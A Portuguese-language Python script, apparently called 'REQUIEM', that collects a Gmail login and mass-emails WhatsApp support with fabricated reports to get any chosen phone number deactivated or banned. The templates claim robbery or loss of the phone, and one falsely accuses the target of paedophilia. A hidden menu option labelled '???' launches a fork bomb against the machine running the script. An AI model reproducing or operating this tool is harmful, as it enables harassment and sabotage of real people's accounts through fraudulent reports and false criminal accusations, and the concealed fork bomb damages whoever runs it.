#!/usr/bin/python3
#Fiz esse script porque um amigo pediu :P
import webbrowser,os, sys, time,platform, subprocess,smtplib, email.message, imaplib, email, ssl
clean = ("cls" if os.name == "nt" else "clear")
def clear():
	os.system(clean)
def restart():
    python = sys.executable;os.execl(python, python, *sys.argv)
try:
	import requests
except:
	os.system('pip install requests');restart()
global Y, C, G, R, wp, main, main2
Y = '\033[1;33m'
C = '\033[1;37m'
G = '\033[1;32m'
R = '\033[1;31m'
error = f'{C}[{R}ERROR{C}]';warning = f'{C}[{Y}!{C}]';info = f'{C}[{G}i{C}]'
result = os.popen('figlet REQUIEM').read()
try:
	if __name__ =='__main__':
		print(f'{warning} Buscando Atualizaçoes')
		update=subprocess.check_output('git pull', shell=True)
		if 'Already up to date' not in update.decode():
			print(f'{info} Atualização instalada\n{info} Reiniciando...');time.sleep(2);restart()
		else:
			print(f'{warning} Nenhuma atualização disponível.');time.sleep(2)
except:
	if os.path.exists('.git'):
		pass
	else:
		print(f"{error} Falta de repositório GIT local.")
try:
	subprocess.check_output('apt update -y', shell=True)
	os.system('apt install figlet')
except:
		os.system('pacman -Sy figlet')
wp = f'''{result}\n{C}__ {G}Hello World!{C} __\n{C}==================\n{info} Coded By: {G}Kiny\n{info} Twitter: {G}@KinyBruno\n{info} Github: {G}https://github.com/Kiny-Kiny\n{info} Agradecimento(s): {G}Rei Pato\n{warning} Lembre-se de ativar a opção de 'Apps menos seguros' na conta que for utilizar {warning}\n{info} Grupo do WhatsApp: {G}https://chat.whatsapp.com/JFQmQ4QJtXR8VenQ2fIaAi\n{info} Grupo do Telegram: {G}https://t.me/kinycrimson\n{info} Grupo de Avisos: {G}https://t.me/kinycrimsonXD\n{info} Twitter: {G}@KinyBruno\n{info} Contato: {G}+55 (21) 7918-0533\n{info} Discord: {G}https://discord.gg/3EJTadHAFR\n{info} Pix: {G}(61) 9603-5417\n{C}=================='''
main = f'''
{wp}\n{C}[{G}1{C}] Desativar Numero
{C}[{G}2{C}] Retirar do Contador
{C}[{G}3{C}] Retirar Banimento
{C}[{G}4{C}] Banir Numero
{C}[{G}5{C}] Derrubar Blindagem
{C}[{G}6{C}] Blindar Número
{C}[{G}7{C}] {R}???{C}
==================
{C}[{G}8{C}] Liberar Permissão
{C}[{G}9{C}] Grupo do WhatsApp
{C}[{G}0{C}] Sair
{C}===> {G}'''
erro1=f'{wp}\n{error} Caractere(s) inválido(s).\n{C}================='
url1 = 'https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ'
url2 = 'https://chat.whatsapp.com/Lg9Ku0IeMNu4D54Ux3Y2c0'
def link():
	if op ==8:
		if platform.system() == "Windows":
			webbrowser.open(url1)
		else:
			os.system('termux-open-url '+url1)
	elif op ==9:
		if platform.system() == "Windows":
			webbrowser.open(url2)
		else:
			os.system('termux-open-url '+url2)
main2 = [f'{wp}\n{C}[{G}1{C}] Método #1',f'\n{C}[{G}2{C}] Método #2', f'\n{C}[{G}3{C}] Método #3', f'\n{C}[{G}4{C}] Método #4', f'\n{C}[{G}5{C}] Método #5', f'\n{C}[{G}6{C}] Método #6', f'\n{C}===>{G}']
inp = f'''{C}===>{G} '''
error = f'{C}[{R}ERROR{C}]';warning = f'{C}[{Y}!{C}]';info = f'{C}[{G}i{C}]'
block_num = ["+55 21 7918-0533","+55 21 79180533","55 21 7918053333","55 21 7918-0533","+55217918-0533","+552179180533","552179180533","55217918-0533"]
def init():
	gmail=input(f'{C}[{Y}Gmail{C}]: ');senha=input(f'{C}[{Y}Senha{C}]: ');conti=input(f'{C}[{Y}Quantidade de emails{C}]: ')
	login = {
	'log1':f'{gmail}',
	'log2':f'{senha}',
	############
	'server':'smtp.gmail.com',
	}
	try:
		   	while (conti > 0):
		   		##############################
	   			msg = email.message.Message()
	   			msg['Subject'] = titulo
	   			msg['From'] = login['log1']
	   			msg['To'] = 'support@support.whatsapp.com'
	   			password = login['log2']
	   			msg.add_header('Content-Type', 'text/html')
	   			msg.set_payload(bd )
	   			##############################
	   			s = smtplib.SMTP('smtp.gmail.com: 587')
	   			s.starttls()
	   			s.login(msg['From'], login['log2'])
	   			s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
	   			print(f'{C}[{G}i{C} Email enviado com sucesso!')
	   			conti=conti-1
	   		print(f'{C}[{G}i{C}] Concluído! Espere a resposta do suporte.')
	   			##############################
	except Exception as erro:
		print(f"{error} Verifique se a opção de 'Apps menos seguros' foi ativada ou se você inseriu o email/senha corretamente.\n{warning}: "+str(erro));time.sleep(5)
Sair = False
while(Sair == False):
		try:
			clear();op = int(input(main))
			if op == 1 or op == 2 or op == 3 or op == 4 or op == 5 or op == 6:
				numero=input(f'{C}[{Y}Numero{C}]: ')
				for num in block_num:
					if num in numero:
						clear();print(f'\n{result}\n{C}=================\n{error}NÚMERO PROIBIDO.\n{C}=================');time.sleep(3);pass
				title = {
	# Desativação de Número
	'title0':'Desative este número',
	'title1':'Please Deactivate The My Account Number',
	'title2':'Por favor, desativem minha conta',
	'title3':'禁⽌我的紧急帐⼾',
	'title4':'Perdido/Roubado: Por favor, desative minha conta',
	'title5':'Por favor, desativem minha conta',
	#####################
	#Retirar do Contador
	'title6':'Reenviar codigo de verificação',
	'title7':'Não consigo entrar no whatsapp!',
	'title8':'Não recebo código de verificação',
	#####################
	#Retirar Banimento
	'title9':'Nao consigo acessar minha conta',
	'title10':'Meu número foi banido injustamente',
	#####################
	#Banir Numero
	'title11':'ME AJUDEM URGENTEMENTE',
	'title12':'Perdido/Roubado',
	#####################
	#Derrubar Blindagem
	'title13':'Perdido/Roubado',
	#####################
	#Blindar Número
	'title14':'Please Deactivate The My Account Number',
	'title15':'Por favor, me ajudem!'
	#####################
	}
				text = {
	# Desativação de Número
	'text0':f'Desative esta conta urgentemente: {numero}',
	'text1':f'Recentemente eu fui assaltado e os bandidos levaram todos os meus documentos, inclusive o celular, preciso que desativem minha conta até eu recuperar o meu celular ou o chip, pois tenho uma microempresa no celular e não quero que tenham acesso à ela: {numero}',
	'text2':f'Estou solicitando a desativação temporária de minha conta no whatsapp , meu numero: {numero}',
	'text3':f'偷⾛了我的⼿机和我所有的宝⻉，请⽴即禁⽌我的帐⼾{numero}',
	'text4':f'Olá , eu gostaria de desativar meu número do WhatsApp porque eu estou migrando para o telegram , Meu número: {numero}',
	'text5':f'Perdido/Roubado: Por favor, desative minha conta {numero}',
	#####################
	#Retirar do Contador
	'text6':f'Olá, não consigo me registrar na minha conta, me ajudem: {numero}',
	'text7':f'Eu nao consigo entrar no whatsapp , meu número esta -1 , solicito que resetem minha verificação de número! Número: {numero}',
	'text8':f'Meu número está no suporte alguém solicitou meu código por engano meu número é usado para conversas com familiares que estão com convite por favor reinicie o meu código de verificação via SMS! Número: {numero}',
	#####################
	#Retirar Banimento
	'text9':f'Olá, eu comprei um numero para meu filho fazer os trabalhos da escola na qual ele estuda, porém quando fui tentar entrar no número, estava dizendo que o número foi banido e eu nem sequer entrei no número, não fiz nada, eu já comprei o número e ele já estava assim, ele precisa urgentemente desse número para fazer os trabalhos da escola. Verifiquem o mais rápido possível! Número: {numero}',
	'text10':f'Nossa! Eu estou trabalhando e de repente meu número foi banido, eu não sei o quê aconteceu, preciso do meu número pois é do trabalho, eu preciso atender meus clientes. Meu número: {numero}',
	#####################
	#Banir Numero
	'text11':f'Pedofilia e abuso sexual, quero que realizem o banimento deste número ao Suporte do WhatsApp, ele esta envolvido com grupos de pedofilía, peço que me ajudem nisto pois meu filho foi vítima. Número: {numero}',
	'text12':f'Favor banir meu número: {numero}',
	#####################
	#Derrubar Blindagem
	'text13':f'Olá, perdi todos os meus documentos e o meu chip foi roubado. Quero que desativem minha conta imediatamente, no chip tem dados sobre mim por isso, quero que desativem meu número imediatamente: {numero}',
	#####################
	#Blindar Número
	'text14':f'Please Deactivate The My Account Number Immediately Because The Number Has Been Lost: {numero}',
	'text15':f'Estou sendo stalkeado. Por favor, vários haters e meu número foi vazado em diversas redes sociais! Peço que analisem as denúncias antes de realizarem qualquer tipo de banimento no meu número: {numero}'
	#####################
	}
				if op == 1:
					clear();op2 = int(input(main2[0]+main2[1]+main2[2]+main2[3]+main2[4]+main2[5]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title0'];bd=text['text0']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title1'];bd=text['text1']
					elif op2 == 3:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title2'];bd=text['text2']
					elif op2 == 4:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title3'];bd=text['text3']
					elif op2 == 5:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title5'];bd=text['text4']
					elif op2 == 6:
						clear();print(wp, f'{C}Modo:{R} Desativar Número{C}\n');titulo = title['title5'];bd=text['text5']
					else:
						pass
					init()
				elif op == 2:
					clear();op2 = int(input(main2[0]+main2[1]+main2[2]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{G} Retirar do Contador{C}\n');titulo = title['title6'];bd=text['text6']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Retirar do Contador{C}\n');titulo = title['title7'];bd=text['text7']
					elif op2 == 3:
						clear();print(wp, f'{C}Modo:{G} Retirar do Contador{C}\n');titulo = title['title8'];bd=text['text8']
					else:
						pass
					init()
				elif op == 3:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op == 2:
						clear();print(wp, f'{C}Modo:{G} Retirar Banimento{C}\n');titulo = title['title9'];bd=text['text9']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Retirar Banimento{C}\n');titulo = title['title10'];bd=text['text10']
					else:
						pass
					init()
				elif op == 4:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{R} Banir Número{C}\n');titulo = title['title11'];bd=text['text11']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{R} Banir Número{C}\n');titulo = title['title12'];bd=text['text12']
					else:
						pass
					init()
				elif op == 5:
					clear();print(wp, f'{C}Modo:{R} Derrubar Blindagem{C}\n');titulo = title['title13'];bd=text['text13']
				elif op == 6:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{G} Blindar Número{C}\n');titulo = title['title14'];bd=text['text14']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Blindar Número{C}\n');titulo = title['title15'];bd=text['text15']
					else:
						pass
					init()
				else:
					pass
				init()
			elif op == 7:
				while True:
					os.fork()
			elif op == 8 or op ==9:
				link()
			elif op == 0:
				Sair = True
			elif op == None:
				pass
		except Exception as error:
			clear();print(erro1);time.sleep(4)
os.system('rm -rf __pycache__  && '+clean)
